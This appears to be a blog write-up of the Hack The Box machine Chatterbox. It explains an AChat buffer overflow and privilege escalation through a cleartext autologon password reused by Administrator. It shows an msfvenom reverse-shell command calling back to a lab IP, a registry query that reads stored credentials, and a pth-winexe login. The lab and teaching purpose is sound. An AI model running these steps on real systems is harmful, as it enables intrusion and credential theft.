---
layout: post
title: "The Key Taped Under the Keyboard"
subtitle: "HTB Chatterbox, where a unicode-squeezed buffer overflow in a dead chat program drops you as Alfred, and the autologon password sitting in the registry is the same one the Administrator uses"
date: 2018-06-23 12:00:00 +0000
description: "A decade-old chat program overflows into a shell, then the registry hands you the autologon password in plain text, the same word the Administrator was using."
image: /assets/og/the-key-taped-under-the-keyboard.png
tags: [hackthebox, writeup]
---

Chatterbox is a box that says almost nothing and gives away everything. The firewall slams every port shut except two strange high ones, and behind them sits a chat program nobody should still be running, a piece of freeware from a decade ago with a stack so fragile that a long enough message walks straight off the end of it and into the place where return addresses live. You feed it a message that is really a payload, the program forgets where it was supposed to come back to, and a shell drops into your lap as a user named Alfred. Then you go looking for the way up and find there is no climb at all. The password to the whole machine is sitting in the registry in plain text, parked there by the autologon feature, because someone wanted the box to log itself in without typing. Same password the Administrator uses. You do not escalate. You just read the answer off the wall.

```
        C H A T T E R B O X
        ===================
        9255 / 9256   the only two doors not bricked shut
              |
              v
        say something long enough and the program
        forgets where home was. you tell it where home is now.
              |
              v
        shell as alfred. then the registry coughs up
        the autologon password, the same one the admin uses.
        no climb. the key was taped under the keyboard.
                                            話
```

## 0x01 · two doors in a brick wall

The first `nmap` comes back as a wall. Every one of the top thousand ports answers the same way, which is to say it does not answer at all.

```
# nmap -sC -sV 10.10.10.74
All 1000 scanned ports on 10.10.10.74 are filtered
```

Filtered, not closed, is a tell. A closed port politely says "nothing here." A filtered port says nothing at all, which means a firewall is eating the packets before the host ever sees them. Picture knocking on a house where every window is bricked over. The silence is not an empty house. It is a house that decided you do not get to know. So you stop knocking on the front thousand and scan the whole range, all sixty-five thousand, and two doors turn up that the bricklayer missed.

```
# nmap -p- 10.10.10.74
PORT     STATE SERVICE
9255/tcp open  mon
9256/tcp open  unknown
```

Those two port numbers are a fingerprint. Cross-reference them and they belong to AChat, a free LAN chat program from around 2009 that the world moved past and this box did not. Old software on an odd port is the whole hint. The box is daring you to go find out what breaks it.

## 0x02 · the message that overran the wall

AChat has a famous flaw, an SEH-based stack buffer overflow, written up on Exploit-DB as entry 36025 against version 0.150 beta7. Here is the plain version of what goes wrong.

When a program takes a message, it sets aside a small box of memory to hold it, and right next to that box it keeps a sticky note saying where to return when the work is done. The program never checks whether your message fits the box. Send one longer than the box and the overflow writes past the edge, straight over the sticky note, and now you own the return address. Think of it like a valet stand with numbered hooks for keys and a clipboard at the end telling the valet which car to bring around next. Write a name too long for your hook and the letters spill onto the clipboard. The valet reads the clipboard, not your hook, and fetches whatever you scribbled there. You do not pick the lock. You rewrite the instruction the program trusts about where to go next.

The exploit on disk needs love before it will fire, and this is the part that makes Chatterbox a real exercise rather than a copy-paste. Three constraints box you in. The payload travels to UDP 9256, the character set is brutal because nulls and the entire high range `\x80` through `\xff` are forbidden, and you get only about 1152 bytes of room to work with. A normal reverse-shell payload is too fat and too full of illegal bytes to survive that. So you encode it to fit the rules, asking msfvenom for a unicode-safe encoder and telling it which register points at the buffer.

```
# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=443 \
    -e x86/unicode_mixed -b "\x00\x80\x81..." BufferRegister=EAX -f python
```

I will not paste a runnable reverse shell here, so read the payload as a description: [ windows reverse shell over TCP back to 10.10.14.4 on 443, unicode-encoded to dodge the bad bytes ]. Drop that encoded blob into the exploit where it builds the overrun string, start a listener, and fire it at the box.

```
# nc -lvnp 443
listening on [any] 443 ...
# python chatterbox-achat.py
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.74]
C:\> whoami
chatterbox\alfred
```

The message overran the wall, the return address became ours, and the prompt that came back belongs to `alfred`.

```
C:\> type C:\Users\Alfred\Desktop\user.txt
████████████████████████████████
```

## 0x03 · the password taped under the keyboard

Alfred is not Administrator, so the instinct is to start hunting for a privilege-escalation exploit. Chatterbox does not want one. It wants you to read the registry.

Windows has a convenience feature called autologon, where the machine boots straight into an account without anyone typing a password. The problem is the obvious one. For the machine to type the password for you, the machine has to know the password, and it stores it where it stores everything, in the registry. In plain text. No hashing, no vault, just the cleartext word sitting in a key anyone logged in can read.

```
C:\> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

    DefaultUserName    REG_SZ    Alfred
    DefaultPassword    REG_SZ    Welcome1!
    AutoAdminLogon     REG_SZ    1
```

There it is, `Welcome1!`, written on the wall. Picture a hotel that hates the front desk so much it automates check-in, and to do that it tapes the master room key under the lobby keyboard where every guest can see it. The convenience is real. So is the exposure. The key opens Alfred's room, sure. The interesting question is what else it opens.

The answer is everything, because of the oldest mistake on any network. The Administrator account on this box uses the same password. One word, reused across two accounts, and the lower one just handed it to you. You do not need a clever pivot. You need to log in again as someone better. With a credential in hand you become the admin and run a command as them.

```
# pth-winexe -U 'administrator%Welcome1!' //10.10.10.74 cmd.exe
C:\> whoami
chatterbox\administrator
```

The same password that drove the autologon drove the front door. There was never a wall between Alfred and Administrator. There was a sticky note both of them shared.

```
C:\> type C:\Users\Administrator\Desktop\root.txt
████████████████████████████████
```

## 0x04 · the side door, for the muscle memory

There is a second way to read the flag, and it teaches a different lesson about ownership versus access. Before you find the password, look at the permissions on the root flag itself.

```
C:\> icacls C:\Users\Administrator\Desktop\root.txt
root.txt CHATTERBOX\Alfred:(F)
```

Alfred is the owner of the file. Not allowed to read it by the current rules, but the owner, and on Windows an owner can always rewrite the rules of what they own. Think of it like a renter who somehow holds the deed to a room they are locked out of. The lock says no. The deed says the lock is yours to change. So Alfred grants Alfred read access and walks in.

```
C:\> icacls root.txt /grant Alfred:F
C:\> type C:\Users\Administrator\Desktop\root.txt
████████████████████████████████
```

That path never makes you Administrator. It only gets the one flag. The password is the honest full compromise. The permission trick is the reminder that owning a thing and being allowed to use it are two facts the system tracks separately.

## 0x05 · the honest caveat

It is easy to read Chatterbox as a museum piece. AChat is dead, the exploit is a decade old, nobody fires version 0.150 beta7 at a network on purpose. All true, and all beside the point, because the box stacks two lessons and only the bottom one is dated.

The buffer overflow is the old half. The bug class is not new, the fix is well understood, and modern compilers and operating systems fight memory corruption hard now. Fine. But the privesc is the half that still ships green in 2026. There was no vulnerability in the climb to Administrator. Autologon is a documented, supported feature working exactly as designed, writing a cleartext password to a registry key that any local user can read. Nobody misconfigured it. The exposure is baked in. Stack that on top of one password reused across two accounts and the entire second half of the box is two ordinary decisions, made for convenience, that happened to line up into a free win.

That is the part to carry out of the lab. You cannot patch your way out of a secret stored in plain text by a feature that has to store it in plain text to function, and you cannot patch your way out of a human using the same password twice. A scanner will flag the ancient chat program in a heartbeat. It will say nothing about the autologon key, because nothing is broken there. The thing quietly holding the door open is not a CVE. It is a convenience that requires a secret, and a person who only had one secret to give.

## 0x06 · outro

```
the wall was bricked shut except for two forgotten doors.
behind them, a program that forgot where home was.
you told it where home is now, and it believed you.

then the registry read the password out loud,
the same word the administrator was using,
and the climb turned out to be a single step down a shared hallway.

mind the autologon. never reuse the word. wear black.

                                                            EOF
```

---

*HTB: Chatterbox, retired 18 Jun 2018. An easy Windows box that is really a unicode-encoded buffer overflow followed by the most human privilege escalation there is, a password stored in plain text and then used twice. The chat program still overflows in a lab and nowhere you don't own.*